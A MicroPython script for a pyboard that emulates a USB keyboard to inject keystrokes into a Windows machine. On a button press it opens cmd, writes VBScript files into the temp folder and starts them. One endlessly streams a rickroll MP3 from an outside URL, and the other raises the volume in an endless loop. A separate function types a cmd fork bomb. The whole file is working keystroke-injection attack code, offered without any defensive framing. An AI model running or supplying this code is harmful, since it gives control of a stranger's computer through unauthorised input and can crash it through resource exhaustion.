import pyb
from keys import KEYS, KEYS_SHIFT, MODS
KEYBOARD = pyb.USB_HID()
KEY_UP = bytearray(8)
LINUX_TERMINAL = bytearray(8)
LINUX_TERMINAL[0], LINUX_TERMINAL[2] = MODS["LCTRL"] + MODS["LALT"], KEYS["t"]
CHANGE_WINDOW = bytearray(8)
CHANGE_WINDOW[0], CHANGE_WINDOW[2] = MODS["LALT"], KEYS["TAB"]
CTRL_Z = bytearray(8)
CTRL_Z[0], CTRL_Z[2] = MODS["LCTRL"], KEYS["z"]
LALT_F4 = bytearray(8)
LALT_F4[0], LALT_F4[2] = MODS["LALT"], KEYS["F4"]


def windows_terminal():
    run = bytearray(8)
    run[0], run[2] = MODS["LMETA"], KEYS["r"]
    send_array(run)
    pyb.delay(100)
    send_string("cmd\\ENTER\\")
    pyb.delay(100)

def map_char(char):
    array = bytearray(8)

    if char in KEYS_SHIFT:
        array[0] = MODS["LSHIFT"]
        array[2] = KEYS_SHIFT[char]
    else:
        array[2] = KEYS[char]

    return array

def send_array(array):
    KEYBOARD.send(array)
    pyb.delay(8)
    KEYBOARD.send(KEY_UP)
    pyb.delay(8)

def send_char(char):
    send_array(map_char(char))

def send_string(string):

    char, string = string[0], string[1:]
    while char:

        if char == "\\":

            escape = ""
            char, string = string[0], string[1:]
            while char != "\\":
                escape += char
                char, string = string[0], string[1:]

            if escape:
                send_char(escape)
            else:
                send_char("\\")
        else:
            send_char(char)

        if string:
            char, string = string[0], string[1:]
        else:
            char = ""

def rickroll():
    windows_terminal()
    pyb.delay(500)
    script_1 = """cd %tmp% && copy con /Y rickyou.vbs
While true
Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
oPlayer.URL = "https://pixelcoding.nl/download/rickroll.mp3"
oPlayer.controls.play
While oPlayer.playState <> 1 ' 1 = Stopped
WScript.Sleep 100
Wend
oPlayer.close
Wend
"""
    string = "\\ENTER\\".join(script_1.splitlines())
    send_string(string)
    send_array(CTRL_Z)
    send_string("\\ENTER\\")
    script_2 = """copy con /Y volup.vbs
do
Set WshShell = CreateObject("WScript.Shell")
WshShell.SendKeys(chr(&hAF))
loop
"""
    string = "\\ENTER\\".join(script_2.splitlines())
    send_string(string)
    send_array(CTRL_Z)
    send_string("\\ENTER\\")
    send_string("start rickyou.vbs && volup.vbs\\ENTER\\exit\\ENTER\\")

def forkbomb():
    windows_terminal()
    pyb.delay(500)
    send_string("cmd /C '%0|%0'\\ENTER\\")

if __name__ == "__main__":
    while True:
        if pyb.Switch()():
            rickroll()

